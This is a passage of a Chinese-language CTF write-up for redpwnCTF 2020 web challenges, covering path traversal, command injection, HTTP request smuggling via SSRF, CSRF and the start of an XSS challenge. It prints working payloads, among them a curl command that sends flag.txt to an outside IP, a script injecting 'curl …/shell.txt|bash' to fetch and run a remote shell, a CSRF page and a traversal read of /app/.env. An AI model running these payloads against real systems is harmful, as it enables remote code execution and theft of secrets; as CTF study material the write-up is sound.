class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>    &#125;    <span class="hljs-keyword">return</span> dir&#125;</code></pre><p>传入字符的时候没影响，但是传入数组的时候情况有不同</p><p><img src="https://s1.ax1x.com/2020/07/01/NTkUm9.png" alt="NTkUm9.png"></p><p>数组第一个为单个字符就可以过</p><p>看preventTraversal()</p><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">preventTraversal</span>(<span class="hljs-params">dir</span>)</span>&#123;    <span class="hljs-keyword">if</span>(dir.includes(<span class="hljs-string">&#x27;../&#x27;</span>))&#123;        <span class="hljs-keyword">let</span> res = dir.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)        <span class="hljs-keyword">return</span> preventTraversal(res)    &#125;    <span class="hljs-comment">//In case people want to test locally on windows</span>    <span class="hljs-keyword">if</span>(dir.includes(<span class="hljs-string">&#x27;..\\&#x27;</span>))&#123;        <span class="hljs-keyword">let</span> res = dir.replace(<span class="hljs-string">&#x27;..\\&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)        <span class="hljs-keyword">return</span> preventTraversal(res)    &#125;    <span class="hljs-keyword">return</span> dir&#125;</code></pre><p>include 对字符和数组的结果有不同之处</p><p><img src="https://s1.ax1x.com/2020/07/01/NTKum8.png" alt="NTKum8.png"></p><p>传入数组的话就可以绕过过滤，想办法构造一个<code>/../../index.js</code>赋值给path就能读flag。<code>path.resolve()</code>，会有一个字符串拼接，如果传入数组，字符串+数组也为字符串。</p><pre><code class="hljs pgsql">payload: ?<span class="hljs-type">path</span>[]=a&amp;<span class="hljs-type">path</span>[]=/../../<span class="hljs-keyword">index</span>.js</code></pre><p>拼接起来是 path=”./public/a,/../../index.js”</p><p>flag到手</p><pre><code class="hljs apache"><span class="hljs-attribute">const</span> flag = &#x27;flag&#123;tr<span class="hljs-number">4</span>v<span class="hljs-number">3</span>rsal_Tim<span class="hljs-number">3</span>&#125;&#x27;</code></pre><h2 id="web-post-it-notes"><a href="#web-post-it-notes" class="headerlink" title="web/post-it-notes"></a>web/post-it-notes</h2><blockquote><p>Request smuggling has many meanings. Prove you understand at least one of them at <a href="http://2020.redpwnc.tf:31957/">2020.redpwnc.tf:31957</a>.</p><p>Note: There are a lot of time-wasting things about this challenge. Focus on finding the vulnerability on the backend API and figuring out how to exploit it.</p></blockquote><p>给了源码，看到api/server.py中</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_note</span>(<span class="hljs-params">nid</span>):</span>    stdout, stderr = subprocess.Popen(<span class="hljs-string">f&quot;cat &#x27;notes/<span class="hljs-subst">&#123;nid&#125;</span>&#x27; || echo it did not work btw&quot;</span>, shell = <span class="hljs-literal">True</span>, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE).communicate()    <span class="hljs-keyword">if</span> stderr:        print(stderr) <span class="hljs-comment"># lemonthink</span>        <span class="hljs-keyword">return</span> &#123;&#125;    <span class="hljs-keyword">return</span> &#123;        <span class="hljs-string">&#x27;success&#x27;</span> : <span class="hljs-literal">True</span>,        <span class="hljs-string">&#x27;title&#x27;</span> : nid,        <span class="hljs-string">&#x27;contents&#x27;</span> : stdout.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors = <span class="hljs-string">&#x27;ignore&#x27;</span>)    &#125;</code></pre><p>很明显有命令注入，nid是由web/server.py中<code>/notes/&lt;nid&gt;</code>传入</p><p><code>payload：/notes/x&#39;;curl ip --data @flag.txt;&#39;</code></p><p>尝试了很多直接反弹shell的payload，最后base64一下才成功反弹成功</p><p><img src="https://s1.ax1x.com/2020/07/02/NqFIdH.png" alt="NqFIdH.png"></p><p>还有一种做法是ssrf+http走私,但是我复现的时候没成功</p><p>web运行在外网，api是运行在内网且端口未知，端口在50000-51000</p><pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    backend_port = random.randint(<span class="hljs-number">50000</span>, <span class="hljs-number">51000</span>)    at = threading.Thread(target = api_server.start, args = (backend_port,))    wt = threading.Thread(target = web_server.start, args = (backend_port,))</code></pre><p><code>check_link()</code>可以探测内网，知道端口号后就可以走私，这里借用y1ng师傅的脚本</p><pre><code class="hljs python"><span class="hljs-comment"># 探测端口</span><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> requrl = <span class="hljs-string">&quot;http://2020.redpwnc.tf:31957/check-links&quot;</span>data = &#123;<span class="hljs-string">&quot;links&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50000</span>,<span class="hljs-number">51000</span>):api = <span class="hljs-string">&quot;http://localhost:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i)data[<span class="hljs-string">&quot;link&quot;</span>] = apir = req.post(url, data=data)<span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;true&quot;</span> <span class="hljs-keyword">in</span> r.text:print(<span class="hljs-string">&quot;success:&quot;</span>+<span class="hljs-built_in">str</span>(i))<span class="hljs-keyword">break</span><span class="hljs-comment"># 走私，命令执行</span><span class="hljs-comment">#!/usr/bin/env python3</span><span class="hljs-comment">#-*- coding:utf-8 -*-</span><span class="hljs-comment">#__author__: 颖奇L&#x27;Amore www.gem-love.com</span><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> req<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote <span class="hljs-keyword">as</span> urlenurl = <span class="hljs-string">&quot;http://2020.redpwnc.tf:31957/check-links&quot;</span><span class="hljs-comment">#bash中用#把后面的命令过滤掉</span>smuggling = <span class="hljs-string">&quot;http://127.0.0.1\r\n\r\nGET /api/v1/notes/?title=&quot;</span> + urlen(<span class="hljs-string">&quot;&#x27;;curl http://gem-love.com/shell.txt|bash #&quot;</span>) + <span class="hljs-string">&quot; HTTP/1.1\r\n\r\n:50596&quot;</span>data = &#123;<span class="hljs-string">&quot;links&quot;</span>:smuggling&#125;req.post(url, data=data)</code></pre><h2 id="web-cookie-recipes-v2"><a href="#web-cookie-recipes-v2" class="headerlink" title="web/cookie-recipes-v2"></a>web/cookie-recipes-v2</h2><blockquote><p>I want to buy some of these recipes, but they are awfully expensive. Can you take a look?</p><p>Site: <a href="https://cookie-recipes-v2.2020.redpwnc.tf/">cookie-recipes-v2.2020.redpwnc.tf</a></p></blockquote><p>登陆进去是一个商店，可以买flag，账户里有的积分不出所料的不够。有一个可以拿积分的地方，可以提交一个url</p><p><img src="https://s1.ax1x.com/2020/07/02/NL0Hvn.png" alt="···"></p><p>到这里就没什么思路了，给了源码,源码中有很多api接口，列出后面用到的几个</p><p>api/getId        获取当前用户ID</p><p>api/userInfo  获取用户信息，能看到密码</p><p>api/gift            送积分</p><p>详细看gift的代码</p><pre><code class="hljs reasonml"><span class="hljs-comment">// Make sure request is from admin</span>        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">if</span> (!database.is<span class="hljs-constructor">Admin(<span class="hljs-params">id</span>)</span>) &#123;                res.write<span class="hljs-constructor">Head(403)</span>;                res.<span class="hljs-keyword">end</span><span class="hljs-literal">()</span>;                return;            &#125;        &#125; catch (error) &#123;            res.write<span class="hljs-constructor">Head(500)</span>;            res.<span class="hljs-keyword">end</span><span class="hljs-literal">()</span>;            return;        &#125;<span class="hljs-comment">// Make sure user has not already received a gift</span>        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-keyword">if</span> (database.received<span class="hljs-constructor">Gift(<span class="hljs-params">user_id</span>)</span>) &#123;                util.respond<span class="hljs-constructor">JSON(<span class="hljs-params">res</span>, 200, <span class="hljs-params">result</span>)</span>;                 return;            &#125;        &#125; catch (error) &#123;            res.write<span class="hljs-constructor">Head(500)</span>;            res.<span class="hljs-keyword">end</span><span class="hljs-literal">()</span>;            return;        &#125;<span class="hljs-comment">// Check admin password to prevent CSRF</span>        <span class="hljs-keyword">let</span> body;        <span class="hljs-keyword">try</span> &#123;            body = await util.parse<span class="hljs-constructor">Request(<span class="hljs-params">req</span>)</span>;        &#125; catch (error) &#123;            res.write<span class="hljs-constructor">Head(400)</span>;            res.<span class="hljs-keyword">end</span><span class="hljs-literal">()</span>;            return;        &#125;<span class="hljs-comment">// User can only receive one gift</span>        <span class="hljs-keyword">try</span> &#123;            database.set<span class="hljs-constructor">Received(<span class="hljs-params">user_id</span>)</span>;        &#125; catch (error) &#123;            res.write<span class="hljs-constructor">Head(500)</span>;            res.<span class="hljs-keyword">end</span><span class="hljs-literal">()</span>;        &#125;</code></pre><p>要求是管理员，在送的时候需要输入管理员的密码，且只能一次队伍送一次，我们可以从</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cookie-recipes-v2.<span class="hljs-number">2020</span>.redpwnc.tf<span class="hljs-regexp">/api/u</span>serInfo?id=<span class="hljs-number">0</span></code></pre><p>得到管理员密码，尝试登陆显示<code>IP address not allowed</code>,那只能通过url输入的地方尝试csrf，构造数据包应该是这样</p><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/gift?id=1141126652894855019</span> HTTP/1.1<span class="hljs-attribute">Host</span>: cookie-recipes-v2.2020.redpwnc.tf<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0<span class="hljs-attribute">Accept</span>: */*<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Content-Type</span>: text/plain<span class="hljs-attribute">Content-Length</span>: 47<span class="hljs-attribute">Connection</span>: close&#123;&quot;password&quot;:&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;&#125;</code></pre><p>id从<code>/api/userInfo</code>获取，需要发送json，从老外wp上学一手用xml构造csrf</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">    <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonreq</span>(<span class="hljs-params"></span>) </span>&#123;</span><span class="javascript">        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest()</span><span class="javascript">        xhr.open(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;https://cookie-recipes-v2.2020.redpwnc.tf/api/gift?id=1141126652894855019&quot;</span>, <span class="hljs-literal">true</span>);</span><span class="javascript">        xhr.withCredentials = <span class="hljs-literal">true</span>;</span><span class="javascript">        xhr.setRequestHeader(<span class="hljs-string">&quot;Content-Type&quot;</span>,<span class="hljs-string">&quot;text/plain&quot;</span>);</span><span class="javascript">        xhr.send(<span class="hljs-built_in">JSON</span>.stringify(&#123;<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;n3cdD3GjyjGUS8PZ3n7dvZerWiY9IRQn&quot;</span>&#125;));</span>    &#125;<span class="javascript">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;</span>        jsonreq();    &#125;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>因为只能送一次积分，所以重复发尝试绕过这个限制。把这个页面放自己服务器，可以用python起服务，直接访问</p><pre><code class="hljs shell">python -m SimpleHTTPServer 4040</code></pre><p>提交 <code>ip:4040/csrf.html</code>,发过去后查看自己的账号有足够的积分，买flag美滋滋</p><p><img src="https://s1.ax1x.com/2020/07/03/NLg7nJ.png" alt="NLg7nJ.png"></p><p>ps.这题还有非预期，直接跨目录读/app/.env</p><pre><code class="hljs shell">curl --path-as-is https://cookie-recipes-v2.2020.redpwnc.tf/../../../../app/.env</code></pre><h2 id="web-Viper"><a href="#web-Viper" class="headerlink" title="web/Viper"></a>web/Viper</h2><blockquote><p>Don’t you want your own ascii viper? No? Well here is Viper as a Service. If you experience any issues, send it <a href="https://admin-bot.redpwnc.tf/submit?challenge=viper">here</a></p><p>NOTE: The admin bot will only accept websites which match the following regex: <code>^http:\/\/2020\.redpwnc\.tf:31291\/viper\/[0-9a-f\-]+$</code></p><p>Site: <a href="http://2020.redpwnc.tf:31291/">2020.redpwnc.tf:31291</a></p></blockquote><p>这题涨知识了！老外真骚</p><p>进去之后可以点击create创建个人页面，然后就没有什么有价值的东西了，给了源码</p><pre><code class="hljs javascript"><span class="hljs-meta">&quot;use strict&quot;</span>;<span class="hljs-comment">/*</span><span class="hljs-comment"> *  @REDPWNCTF 2020</span><span class="hljs-comment"> *  @AUTHOR Jim</span><span class="hljs-comment"> */</span><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;body-parser&quot;</span>);<span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>);<span class="hljs-keyword">const</span> redis = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;redis&#x27;</span>);<span class="hljs-keyword">const</span> redisStore = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;connect-redis&#x27;</span>)(session);<span class="hljs-keyword">const</span> mcache = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;memory-cache&#x27;</span>);<span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">v4</span>: uuidv4 &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;uuid&#x27;</span>);<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;fs&quot;</span>);<span class="hljs-keyword">const</span> app = express();<span class="hljs-keyword">const</span> client  = redis.createClient(<span class="hljs-string">&#x27;redis://redis:6379&#x27;</span>);app.use(express.static(__dirname + <span class="hljs-string">&quot;/public&quot;</span>));app.use(bodyParser.json());app.use(session(&#123;    secret: <span class="hljs-string">&#x27;REDACTED&#x27;</span>, <span class="hljs-comment">// README it&#x27;s not literally REDACTED on server</span>    store: <span class="hljs-keyword">new</span> redisStore(&#123; <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;redis&#x27;</span>, <span class="hljs-attr">port</span>: <span class="hljs-number">6379</span>, <span class="hljs-attr">client</span>: client&#125;),    saveUninitialized: <span class="hljs-literal">false</span>,    resave: <span class="hljs-literal">false</span>&#125;));app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;    res.setHeader(<span class="hljs-string">&quot;Content-Security-Policy&quot;</span>, <span class="hljs-string">&quot;default-src &#x27;self&#x27;&quot;</span>);    res.setHeader(<span class="hljs-string">&quot;X-Frame-Options&quot;</span>, <span class="hljs-string">&quot;DENY&quot;</span>)    <span class="hljs-keyword">return</span> next();&#125;);app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>);<span class="hljs-keyword">const</span> middleware = <span class="hljs-function">(<span class="hljs-params">duration</span>) =&gt;</span> &#123;    <span class="hljs-keyword">return</span><span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;        <span class="hljs-keyword">const</span> key = <span class="hljs-string">&#x27;__rpcachekey__|&#x27;</span> + req.originalUrl + req.headers[<span class="hljs-string">&#x27;host&#x27;</span>].split(<span class="hljs-string">&#x27;:&#x27;</span>)[<span class="hljs-number">0</span>];        <span class="hljs-keyword">let</span> cachedBody = mcache.get(key);        <span class="hljs-keyword">if</span>(cachedBody)&#123;            res.send(cachedBody);            <span class="hljs-keyword">return</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            res.sendResponse = res.send;            res.send = <span class="hljs-function">(<span class="hljs-params">body</span>) =&gt;</span> &#123;                mcache.put(key, body, duration * <span class="hljs-number">1000</span>);                res.sendResponse(body);            &#125;            next();        &#125;    &#125;&#125;;app.get(<span class="hljs-string">&#x27;/create&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;    <span class="hljs-keyword">let</span> sess = req.session;    <span class="hljs-keyword">if</span>(!sess.viperId)&#123;        <span class="hljs-keyword">const</span> newViperId = uuidv4();        sess.viperId = newViperId;        sess.viperName = newViperId;    &#125;    res.redirect(<span class="hljs-string">&#x27;/viper/&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(sess.viperId));&#125;);app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;    res.render(<span class="hljs-string">&#x27;pages/index&#x27;</span>);&#125;);app.get(<span class="hljs-string">&#x27;/viper/:viperId&#x27;</span>, middleware(<span class="hljs-number">20</span>), <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;    <span class="hljs-keyword">let</span> viperId = req.params.viperId;    <span class="hljs-keyword">let</span> sess = req.session;    <span class="hljs-keyword">const</span> sessViperId = sess.viperId;    <span class="hljs-keyword">const</span> sessviperName = sess.viperName;    <span class="hljs-keyword">if</span>(sess.isAdmin)&#123;        sess.viperId = <span class="hljs-string">&quot;admin_account&quot;</span>;        sess.viperName = <span class="hljs-string">&quot;admin_account&quot;</span>;    &#125;    <span class="hljs-keyword">if</span>(viperId === sessViperId || sess.isAdmin)&#123;        res.render(<span class="hljs-string">&#x27;pages/viper&#x27;</span>, &#123;            name: sessviperName,            analyticsUrl: <span class="hljs-string">&#x27;http://&#x27;</span> + req.headers[<span class="hljs-string">&#x27;host&#x27;</span>] + <span class="hljs-string">&#x27;/analytics?ip_address=&#x27;</span> + req.headers[<span class="hljs-string">&#x27;x-real-ip&#x27;</span>]        &#125;);    &#125;<span class="hljs-keyword">else</span>&#123;        res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>);    &#125;&#125;);app.get(<span class="hljs-string">&#x27;/editviper&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;    <span class="hljs-keyword">let</span> viperName = req.query.viperName;    <span class="hljs-keyword">let</span> sess = req.session;    <span class="hljs-keyword">if</span>(sess.viperId)&#123;        sess.viperName = viperName;        res.redirect(<span class="hljs-string">&#x27;/viper/&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(sess.viperId));    &#125;<span class="hljs-keyword">else</span>&#123;        res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>);    &#125;&#125;);app.get(<span class="hljs-string">&#x27;/logout&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;    <span class="hljs-keyword">let</span> sess = req.session;    sess.destroy();    res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>);&#125;);app.get(<span class="hljs-string">&#x27;/analytics&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;    <span class="hljs-keyword">const</span> ip_address = req.query.ip_address;    <span class="hljs-keyword">if</span>(!ip_address)&#123;        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request body&quot;</span>);        <span class="hljs-keyword">return</span>;    &#125;    client.exists(ip_address, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;        <span class="hljs-keyword">if</span> (reply === <span class="hljs-number">1</span>) &#123;            client.incr(ip_address, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;                <span class="hljs-keyword">if</span>(err)&#123;                    res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);                    <span class="hljs-keyword">return</span>;                &#125;                res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Success! &quot;</span> + ip_address + <span class="hljs-string">&quot; has visited the site &quot;</span> + reply + <span class="hljs-string">&quot; times.&quot;</span>);            &#125;);        &#125; <span class="hljs-keyword">else</span> &#123;            client.set(ip_address, <span class="hljs-number">1</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;                <span class="hljs-keyword">if</span>(err)&#123;                    res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);                    <span class="hljs-keyword">return</span>;                &#125;                res.status(<span class="hljs-number">200</span>).send(<span class="hljs-string">&quot;Success! &quot;</span> + ip_address + <span class="hljs-string">&quot; has visited the site 1 time.&quot;</span>);            &#125;);        &#125;    &#125;); &#125;); <span class="hljs-comment">// README: This is the code used to generate the cookie stored on the admin user</span> app.get(<span class="hljs-string">&#x27;/admin/generate/:secret_token&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;    <span class="hljs-keyword">const</span> secret_token = <span class="hljs-string">&quot;REDACTED&quot;</span>; <span class="hljs-comment">// README it&#x27;s not literally READACTED on chall server</span>    <span class="hljs-keyword">if</span>(req.params.secret_token === secret_token)&#123;        <span class="hljs-keyword">let</span> sess = req.session;        sess.viperId = <span class="hljs-string">&quot;admin_account&quot;</span>;        sess.viperName = <span class="hljs-string">&quot;admin_account&quot;</span>;        sess.isAdmin = <span class="hljs-literal">true</span>;    &#125;    res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>); &#125;); <span class="hljs-keyword">const</span> getRandomInt = <span class="hljs-function">(<span class="hljs-params">min, max</span>) =&gt;</span> &#123;    min = <span class="hljs-built_in">Math</span>.ceil(min);    max = <span class="hljs-built_in">Math</span>.floor(max);    <span class="hljs-keyword">return</span> <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.random() * (max - min + <span class="hljs-number">1</span>)) + min; &#125;; app.get(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;    <span class="hljs-keyword">let</span> sess = req.session;    <span class="hljs-keyword">if</span>(sess.isAdmin)&#123;        client.exists(<span class="hljs-string">&#x27;__csrftoken__&#x27;</span> + sess.viperId, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;            <span class="hljs-keyword">if</span>(err)&#123;                res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);                <span class="hljs-keyword">return</span>;            &#125;            <span class="hljs-keyword">if</span> (reply === <span class="hljs-number">1</span>) &#123;                client.get(<span class="hljs-string">&#x27;__csrftoken__&#x27;</span> + sess.viperId, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;                    <span class="hljs-keyword">if</span>(err)&#123;                        res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);                        <span class="hljs-keyword">return</span>;                    &#125;                    res.render(<span class="hljs-string">&#x27;pages/admin&#x27;</span>, &#123;                        csrfToken: Buffer.from(reply).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)                    &#125;);                &#125;);            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">const</span> randomToken = getRandomInt(<span class="hljs-number">10000</span>, <span class="hljs-number">1000000000</span>);                client.set(<span class="hljs-string">&#x27;__csrftoken__&#x27;</span> + sess.viperId, randomToken, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;                    <span class="hljs-keyword">if</span>(err)&#123;                        res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);                        <span class="hljs-keyword">return</span>;                    &#125;                    res.render(<span class="hljs-string">&#x27;pages/admin&#x27;</span>, &#123;                        csrfToken: Buffer.from(randomToken).toString(<span class="hljs-string">&#x27;base64&#x27;</span>)                    &#125;);                &#125;);            &#125;        &#125;);    &#125;<span class="hljs-keyword">else</span>&#123;        res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>);    &#125; &#125;); app.get(<span class="hljs-string">&#x27;/admin/create&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;    <span class="hljs-keyword">let</span> sess = req.session;    <span class="hljs-keyword">let</span> viperId = req.query.viperId;    <span class="hljs-keyword">let</span> csrfToken = req.query.csrfToken;    <span class="hljs-keyword">const</span> v4regex = <span class="hljs-keyword">new</span> <span class="hljs-built_in">RegExp</span>(<span class="hljs-string">&quot;^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-4[0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>);    <span class="hljs-keyword">if</span>(!viperId.match(v4regex))&#123;        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request body&quot;</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">if</span>(!viperId || !csrfToken)&#123;        res.status(<span class="hljs-number">400</span>).send(<span class="hljs-string">&quot;Bad request body&quot;</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">if</span>(sess.isAdmin)&#123;        client.exists(<span class="hljs-string">&#x27;__csrftoken__&#x27;</span> + sess.viperId, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;            <span class="hljs-keyword">if</span>(err)&#123;                res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);                <span class="hljs-keyword">return</span>;            &#125;            <span class="hljs-keyword">if</span> (reply === <span class="hljs-number">1</span>) &#123;                client.get(<span class="hljs-string">&#x27;__csrftoken__&#x27;</span> + sess.viperId, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;                    <span class="hljs-keyword">if</span>(err)&#123;                        res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);                        <span class="hljs-keyword">return</span>;                    &#125;                    <span class="hljs-keyword">if</span>(reply === Buffer.from(csrfToken, <span class="hljs-string">&#x27;base64&#x27;</span>).toString(<span class="hljs-string">&#x27;ascii&#x27;</span>))&#123;                        <span class="hljs-keyword">const</span> randomToken = getRandomInt(<span class="hljs-number">1000000</span>, <span class="hljs-number">10000000000</span>);                        client.set(<span class="hljs-string">&#x27;__csrftoken__&#x27;</span> + sess.viperId, randomToken, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, reply</span>) </span>&#123;                            <span class="hljs-keyword">if</span>(err)&#123;                                res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&quot;Something went wrong&quot;</span>);                                <span class="hljs-keyword">return</span>;                            &#125;                        &#125;);                        sess.viperId = viperId;                        sess.viperName = fs.readFileSync(<span class="hljs-string">&#x27;./flag.txt&#x27;</span>).toString();                        res.redirect(<span class="hljs-string">&#x27;/viper/&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(sess.viperId));                    &#125;<span class="hljs-keyword">else</span>&#123;                        res.status(<span class="hljs-number">401</span>).send(<span class="hljs-string">&quot;Unauthorized&quot;</span>);                    &#125;                &#125;);            &#125; <span class="hljs-keyword">else</span> &#123;                res.status(<span class="hljs-number">401</span>).send(<span class="hljs-string">&quot;Unauthorized&quot;</span>);            &#125;        &#125;);    &#125;<span class="hljs-keyword">else</span>&#123;        res.redirect(<span class="hljs-string">&#x27;/&#x27;</span>);    &#125; &#125;);app.listen(<span class="hljs-number">31337</span>, <span class="hljs-function">() =&gt;</span> &#123;    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;express listening on 31337&quot;</span>);&#125;);</code></pre><p>可以看到获取flag需要<code> app.get(&#39;/admin/create&#39;, function(req, res)</code>需要这个路由创建一个页面，把读取的flag.txt放入<code>viperName</code>。访问<a href="http://2020.redpwnc.tf:31291/viper/+">http://2020.redpwnc.tf:31291/viper/+</a> 对应的viperId,就能看到flag。但是这个路由只能admin访问，所以考虑能不能xss让admin访问这个页面，题目描述上给 机器人的地址且说明了只接受<code>^http:\/\/2020\.redpwnc\.tf:31291\/viper\/[0-9a-f\-]+$</code>这样的地址，也就是我们创建的页面，从中看看有没有利用点。</p><p>源码中viper.ejs（EJS 是一套简单的模板语言，帮你利用普通的 JavaScript 代码生成 HTML 页面。），也就是页面的模板中两个地方是可变的地方<code> &lt;%= name %&gt;  &lt;%- analyticsUrl %&gt;</code>。</p><p>在ejs中，参考 <a href="https://ejs.bootcss.com/#install">https://ejs.bootcss.com/#install</a></p><p><code>&lt;%=</code> 输出数据到模板（输出是转义 HTML 标签）</p><p><code>&lt;%-</code> 输出非转义的数据到模板</p><p>也就是name会被转义，analyticsUrl不会，所以analyticsUrl可能会有xss</p><pre><code class="hljs prolog">analyticsUrl: <span class="hljs-string">&#x27;http://&#x27;</span> + req.headers[<span class="hljs-string">&#x27;host&#x27;</span>] + <span class="hljs-string">&#x27;/analytics?ip_address=&#x27;</span> + req.headers[<span 